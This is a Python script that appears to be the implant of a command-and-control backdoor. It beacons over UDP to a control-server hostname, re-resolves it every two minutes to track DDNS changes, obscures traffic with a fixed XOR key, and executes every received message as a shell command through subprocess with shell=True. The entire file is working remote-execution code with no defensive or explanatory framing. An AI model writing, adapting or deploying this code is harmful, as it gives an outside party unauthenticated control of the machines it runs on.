import socket
import threading
import time
import subprocess

SECRET_KEY = b'SECRETKEYCHANGEXOR'
control_server_host = 'example.com' # DDNS hostname or IP
control_server_port = 49183

target_server_host = '0.0.0.0'
target_server_port = 49184

def xor_encrypt_decrypt(data):
    return bytes([data[i] ^ SECRET_KEY[i % len(SECRET_KEY)] for i in range(len(data))])

def handle_command(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, universal_newlines=True)
        print(result)
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e.output}")

def send_initial_message():
    initial_message = "TARGET_CONNECTED"
    encrypted_message = xor_encrypt_decrypt(initial_message.encode())
    target_socket.sendto(encrypted_message, (resolved_control_server_host, control_server_port))

def handle_control_messages():
    while True:
        encrypted_data, addr = target_socket.recvfrom(1024)
        if encrypted_data:
            decrypted_data = xor_encrypt_decrypt(encrypted_data)
            command = decrypted_data.decode()
            print(f"Received from Control Server: {command}")
            threading.Thread(target=handle_command, args=(command,), daemon=True).start()

def check_ip_change():
    global resolved_control_server_host
    while True:
        try:
            current_resolved_host = socket.gethostbyname(control_server_host)
            if current_resolved_host != resolved_control_server_host:
                print(f"Control Server IP changed to {current_resolved_host}. Reconnecting...")
                resolved_control_server_host = current_resolved_host
                send_initial_message()
        except Exception as e:
            print(f"Error resolving Control Server hostname: {e}")

        time.sleep(120) # Check every 2 minutes

if __name__ == '__main__':
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    target_socket.bind((target_server_host, target_server_port))

    resolved_control_server_host = socket.gethostbyname(control_server_host)
    send_initial_message()

    print(f"Target server is listening for commands from {control_server_host}:{control_server_port}")

    threading.Thread(target=handle_control_messages, daemon=True).start()
    threading.Thread(target=check_ip_change, daemon=True).start() # Start the IP checking thread

    try:
        while True:
            # Keep the target server running
            pass
    except KeyboardInterrupt:
        print("Shutting down...")
